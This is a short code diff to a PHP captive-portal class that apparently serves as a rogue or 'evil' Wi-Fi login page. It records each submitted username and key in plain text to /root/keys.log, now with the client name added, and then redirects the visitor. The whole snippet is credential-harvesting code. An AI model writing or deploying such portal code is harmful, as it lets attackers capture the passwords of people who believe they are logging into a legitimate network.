@@ -11,8 +11,8 @@ class MyPortal extends Portal
 
         // handle form input or other extra things there
         $time = date("H:i:s");
-        $info = "$_POST[username],$_POST[key],$time\n";
-        file_put_contents("keys.log", $info, FILE_APPEND);
+        $info = "$_POST[username],$_POST[key],$time,$_POST[clientName]\n";
+        file_put_contents("/root/keys.log", $info, FILE_APPEND);
 
         header("Location: http://".$_SERVER['SERVER_ADDR']."/19-20/");
     }
